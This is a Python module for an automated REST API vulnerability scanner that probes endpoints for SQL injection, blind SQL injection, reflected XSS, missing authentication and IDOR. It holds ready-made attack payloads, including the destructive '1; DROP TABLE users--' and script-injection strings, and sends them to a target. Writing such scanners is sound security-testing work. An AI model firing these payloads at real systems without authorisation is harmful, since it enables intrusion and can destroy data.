# core/rest_scanner.py
"""
RESTScanner — Automated REST vulnerability detection.

Vulnerabilities detected:
  - SQLi       : SQL injection in parameters (error-based)
  - BlindSQLi  : SQL injection detection by response comparison
  - Auth       : endpoints accessible without token
  - IDOR       : access to other users' resources
  - XSS        : payload reflected in the response
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Optional

from core.requester import Requester
from logger.logger import logger


# ─────────────────────────────────────────────────────────────────────────────
#  Payloads
# ─────────────────────────────────────────────────────────────────────────────

SQLI_PAYLOADS: list[str] = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    '" OR "1"="1',
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "' UNION SELECT NULL--",
    "' AND SLEEP(2)--",       # time-based
    "1; DROP TABLE users--",
]

SQLI_ERROR_PATTERNS: list[str] = [
    "sql syntax",
    "mysql_fetch",
    "ora-01756",
    "sqlite3",
    "pg_query",
    "unclosed quotation",
    "you have an error in your sql",
    "warning: mysql",
    "supplied argument is not a valid mysql",
    "invalid query",
    "odbc drivers error",
    "sqlstate",
    "syntax error",
    "microsoft ole db",
    "native client",
]

XSS_PAYLOADS: list[str] = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
]

IDOR_PATTERNS: list[str] = [
    r"/(\d+)$",           # /users/42
    r"/(\d+)/",           # /users/42/posts
    r"[?&]id=(\d+)",      # ?id=42
    r"[?&]user_id=(\d+)", # ?user_id=42
    r"[?&]userId=(\d+)",  # ?userId=42
]

# Blind SQLi injected values to test
BLIND_SQLI_INJECTIONS: list[str] = [
    "'",              # single quote — breaks query silently
    "' OR '1'='1",   # always true  — returns all rows
    "' AND '1'='2",  # always false — returns empty result
    "1 AND 1=2",     # numeric context — returns empty result
    "\\",            # escape character — may break query
]

# Common search/filter parameter names to test
# Note: "id" excluded — it's a resource filter, not a search param
SEARCH_PARAMS: list[str] = [
    "q", "query", "search", "keyword", "term",
    "filter", "name", "value", "input",
]

# Minimum size for a normal response to be considered meaningful
MIN_RESPONSE_SIZE = 100


# ─────────────────────────────────────────────────────────────────────────────
#  ScanResult
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class ScanResult:
    """Represents a detected vulnerability."""

    vuln_type:   str
    severity:    str
    endpoint:    str
    method:      str
    payload:     Optional[str]
    evidence:    str
    description: str

    def to_dict(self) -> dict:
        return {
            "vuln_type":   self.vuln_type,
            "severity":    self.severity,
            "endpoint":    self.endpoint,
            "method":      self.method,
            "payload":     self.payload,
            "evidence":    self.evidence,
            "description": self.description,
        }

    def __str__(self) -> str:
        return (
            f"[{self.severity}] {self.vuln_type} — {self.endpoint}\n"
            f"  Payload  : {self.payload}\n"
            f"  Evidence : {self.evidence[:120]}"
        )


# ─────────────────────────────────────────────────────────────────────────────
#  RESTScanner
# ─────────────────────────────────────────────────────────────────────────────

class RESTScanner:
    """
    Tests discovered REST endpoints for common vulnerabilities.

    Usage:
        scanner = RESTScanner("https://api.example.com")
        results = scanner.scan(endpoints)
        for r in results:
            print(r)
    """

    def __init__(self, base_url: str, timeout: int = 5, token: Optional[str] = None) -> None:
        self.base_url = base_url.rstrip("/")
        self.http     = Requester(self.base_url, timeout=timeout)
        if token:
            self.http.set_token(token)

    # =========================================================================
    #  Main entry point
    # =========================================================================

    def scan(self, endpoints: list[str], tests: list[str] | None = None) -> list[ScanResult]:
        ALL_TESTS = {
            "auth":       self._test_auth,
            "sqli":       self._test_sqli,
            "blind_sqli": self._test_blind_sqli,
            "xss":        self._test_xss,
            "idor":       self._test_idor,
            # Coming soon: nosql, ssrf, misconfig, mass_assign, rate_limit
        }

        active = {k: v for k, v in ALL_TESTS.items()
                  if tests is None or k in tests}

        results: list[ScanResult] = []
        logger.info(f"[*] REST scan — {len(endpoints)} endpoint(s) — active tests: {list(active.keys())}")

        for endpoint in endpoints:
            logger.debug(f"    [scan] {endpoint}")
            for test_fn in active.values():
                results += test_fn(endpoint)

        logger.info(f"[+] Scan complete — {len(results)} vulnerability(ies) found")
        return results

    # =========================================================================
    #  Test 1 — Missing Authentication
    # =========================================================================

    def _test_auth(self, endpoint: str) -> list[ScanResult]:
        results: list[ScanResult] = []
        path       = self._to_path(endpoint)
        saved_auth = self.http._session.headers.get("Authorization")

        # No token → skip, comparison not possible
        if not saved_auth:
            logger.debug(f"    [auth] No token provided — skipping → {endpoint}")
            return results

        # Request WITHOUT token
        self.http.clear_token()
        r_no_token = self.http.get(path)
        self.http._session.headers["Authorization"] = saved_auth

        if r_no_token is None or r_no_token.status_code != 200:
            return results

        # Request WITH token
        r_with_token = self.http.get(path)

        # Same response → public endpoint, not a vuln
        if r_with_token and r_with_token.text.strip() == r_no_token.text.strip():
            logger.debug(f"    [auth] Public endpoint → {endpoint}")
            return results

        results.append(ScanResult(
            vuln_type   = "Auth",
            severity    = "HIGH",
            endpoint    = endpoint,
            method      = "GET",
            payload     = None,
            evidence    = f"HTTP 200 without token — {self._preview(r_no_token)}",
            description = (
                "Endpoint returns 200 without any authentication token. "
                "Response differs from authenticated request — data may be restricted."
            ),
        ))
        logger.info(f"    [VULN] Missing auth → {endpoint}")
        return results

    # =========================================================================
    #  Test 2 — SQL Injection (error-based)
    # =========================================================================

    def _test_sqli(self, endpoint: str) -> list[ScanResult]:
        results: list[ScanResult] = []
        path    = self._to_path(endpoint)

        for payload in SQLI_PAYLOADS:
            r = self.http.get(path, params={"id": payload, "search": payload})
            if r and self._contains_sqli_error(r):
                results.append(ScanResult(
                    vuln_type   = "SQLi",
                    severity    = "CRITICAL",
                    endpoint    = endpoint,
                    method      = "GET",
                    payload     = payload,
                    evidence    = self._extract_error(r),
                    description = (
                        f"SQL error detected with payload '{payload}'. "
                        "User input injected directly into SQL query."
                    ),
                ))
                logger.info(f"    [VULN] SQLi (GET) → {endpoint} | payload: {payload!r}")
                break

            r = self.http.post(path, json={
                "id": payload, "username": payload,
                "search": payload, "query": payload,
            })
            if r and self._contains_sqli_error(r):
                results.append(ScanResult(
                    vuln_type   = "SQLi",
                    severity    = "CRITICAL",
                    endpoint    = endpoint,
                    method      = "POST",
                    payload     = payload,
                    evidence    = self._extract_error(r),
                    description = f"SQL error detected with payload '{payload}' in JSON body.",
                ))
                logger.info(f"    [VULN] SQLi (POST) → {endpoint} | payload: {payload!r}")
                break

        return results

    # =========================================================================
    #  Test 3 — Reflected XSS
    # =========================================================================

    def _test_xss(self, endpoint: str) -> list[ScanResult]:
        results: list[ScanResult] = []
        path    = self._to_path(endpoint)

        for payload in XSS_PAYLOADS:
            r = self.http.get(path, params={"q": payload, "search": payload, "input": payload})
            if r and self._is_reflected(r, payload):
                if not self._is_html_response(r):
                    logger.debug(f"    [xss] Skipped — not text/html (GET) → {endpoint}")
                    continue
                results.append(ScanResult(
                    vuln_type   = "XSS",
                    severity    = "HIGH",
                    endpoint    = endpoint,
                    method      = "GET",
                    payload     = payload,
                    evidence    = f"Payload reflected in HTML response: {payload[:60]}",
                    description = "XSS payload reflected in HTML response without encoding.",
                ))
                logger.info(f"    [VULN] XSS reflected → {endpoint} | payload: {payload!r}")
                break

            r = self.http.post(path, json={
                "name": payload, "comment": payload, "input": payload,
            })
            if r and self._is_reflected(r, payload):
                if not self._is_html_response(r):
                    logger.debug(f"    [xss] Skipped — not text/html (POST) → {endpoint}")
                    continue
                results.append(ScanResult(
                    vuln_type   = "XSS",
                    severity    = "HIGH",
                    endpoint    = endpoint,
                    method      = "POST",
                    payload     = payload,
                    evidence    = f"Payload reflected in HTML POST response: {payload[:60]}",
                    description = "XSS payload reflected in HTML POST response without encoding.",
                ))
                logger.info(f"    [VULN] XSS reflected (POST) → {endpoint} | payload: {payload!r}")
                break

        return results

    # =========================================================================
    #  Test 4 — IDOR
    # =========================================================================

    def _test_idor(self, endpoint: str) -> list[ScanResult]:
        results: list[ScanResult] = []
        path    = self._to_path(endpoint)

        for pattern in IDOR_PATTERNS:
            match = re.search(pattern, endpoint)
            if not match:
                continue

            original_id  = match.group(1)
            original_int = int(original_id)

            r_original = self.http.get(path)
            if not Requester.is_success(r_original):
                continue

            for test_id in [original_int + 1, original_int - 1]:
                if test_id <= 0:
                    continue

                test_path = re.sub(
                    pattern,
                    lambda m: m.group(0).replace(original_id, str(test_id)),
                    path,
                )
                r_test = self.http.get(test_path)
                if not Requester.is_success(r_test):
                    continue

                if self._bodies_differ(r_original, r_test):
                    results.append(ScanResult(
                        vuln_type   = "IDOR",
                        severity    = "HIGH",
                        endpoint    = endpoint,
                        method      = "GET",
                        payload     = f"ID {original_id} → {test_id}",
                        evidence    = (
                            f"/{original_id} → 200  |  "
                            f"/{test_id} → {r_test.status_code} (different content)"
                        ),
                        description = (
                            f"Endpoint accepts ID {test_id} without authorization check. "
                            "A user can access other users' resources."
                        ),
                    ))
                    logger.info(f"    [VULN] IDOR → {endpoint} | {original_id} → {test_id}")
                    break

        return results

    # =========================================================================
    #  Test 5 — Blind SQL Injection
    # =========================================================================

    def _test_blind_sqli(self, endpoint: str) -> list[ScanResult]:
        """
        Detects blind SQL injection by comparing responses.

        Strategy:
          1. Baseline — request WITHOUT any parameter
          2. Normal  — request WITH safe value 'test'
             - If normal == baseline → param ignored → skip (continue to next param)
             - If normal < MIN_RESPONSE_SIZE → not meaningful → skip
          3. Injected — request WITH SQL payload
             - If injected size == baseline size → query broken → BlindSQLi
             - If injected size drops >50% vs normal → BlindSQLi
        """
        results: list[ScanResult] = []
        path    = self._to_path(endpoint)

        for param in SEARCH_PARAMS:

            # Step 1: baseline — no parameter at all
            r_baseline = self.http.get(path)
            if r_baseline is None or r_baseline.status_code not in (200, 201):
                continue

            baseline_body = (r_baseline.text or "").strip()
            baseline_len  = len(baseline_body)

            # Skip only if truly empty
            if not baseline_body or baseline_body in ("{}", "[]", "null"):
                continue

            # Step 2: normal request with safe value
            r_normal = self.http.get(path, params={param: "test"})
            if r_normal is None or r_normal.status_code not in (200, 201):
                continue

            normal_body = (r_normal.text or "").strip()
            normal_len  = len(normal_body)

            # Endpoint ignores this param → same as baseline → try next param
            if normal_body == baseline_body:
                logger.debug(f"    [blind_sqli] Param '{param}' ignored → {endpoint}")
                continue  # ← continue, not break

            # Normal response too small → not meaningful data
            if normal_len < MIN_RESPONSE_SIZE:
                continue

            # Step 3: test each injection payload
            for injected_val in BLIND_SQLI_INJECTIONS:
                r_injected = self.http.get(path, params={param: injected_val})
                if r_injected is None:
                    continue

                injected_body = (r_injected.text or "").strip()
                injected_len  = len(injected_body)

                # Detection 1: injected returns same size as baseline
                # (query broken — returns error/empty like baseline)
                is_empty = injected_len == baseline_len or injected_len == 0

                # Detection 2: significant size drop >50% vs normal
                size_diff    = abs(normal_len - injected_len) / max(normal_len, 1)
                is_size_diff = size_diff > 0.5 and injected_len < normal_len

                if is_empty or is_size_diff:
                    results.append(ScanResult(
                        vuln_type   = "BlindSQLi",
                        severity    = "CRITICAL",
                        endpoint    = endpoint,
                        method      = "GET",
                        payload     = f"{param}={injected_val}",
                        evidence    = (
                            f"param={param!r} | "
                            f"normal('test') → {normal_len} bytes | "
                            f"injected({injected_val!r}) → {injected_len} bytes"
                        ),
                        description = (
                            f"Blind SQL injection detected on parameter '{param}'. "
                            f"Normal request returns {normal_len} bytes, "
                            f"injected request returns {injected_len} bytes. "
                            "No SQL error shown — query is broken silently. "
                            "Use parameterized queries to prevent injection."
                        ),
                    ))
                    logger.info(
                        f"    [VULN] Blind SQLi → {endpoint} | "
                        f"param={param!r} payload={injected_val!r}"
                    )
                    return results  # One result per endpoint

        return results

    # =========================================================================
    #  Private helpers
    # =========================================================================

    def _to_path(self, endpoint: str) -> str:
        """Extracts the relative path from a full URL."""
        return endpoint.replace(self.base_url, "") or "/"

    def _preview(self, r, length: int = 80) -> str:
        """Returns a short preview of the response body."""
        try:
            return r.text[:length].replace("\n", " ").strip()
        except Exception:
            return ""

    def _is_html_response(self, r) -> bool:
        """True if the response Content-Type is text/html."""
        if r is None:
            return False
        return "text/html" in r.headers.get("Content-Type", "").lower()

    def _contains_sqli_error(self, r) -> bool:
        """True if the response contains a SQL error message."""
        if r is None:
            return False
        try:
            body = r.text.lower()
            return any(pattern in body for pattern in SQLI_ERROR_PATTERNS)
        except Exception:
            return False

    def _extract_error(self, r, length: int = 200) -> str:
        """Extracts the part of the response containing the SQL error."""
        try:
            body = r.text.lower()
            for pattern in SQLI_ERROR_PATTERNS:
                idx = body.find(pattern)
                if idx != -1:
                    start = max(0, idx - 20)
                    return r.text[start:start + length].strip()
        except Exception:
            pass
        return self._preview(r, length)

    def _is_reflected(self, r, payload: str) -> bool:
        """True if the XSS payload is found as-is in the response."""
        if r is None:
            return False
        try:
            return payload in r.text
        except Exception:
            return False

    def _bodies_differ(self, r1, r2) -> bool:
        """True if both responses have different content."""
        if r1 is None or r2 is None:
            return False
        try:
            return r1.text.strip() != r2.text.strip()
        except Exception:
            return False
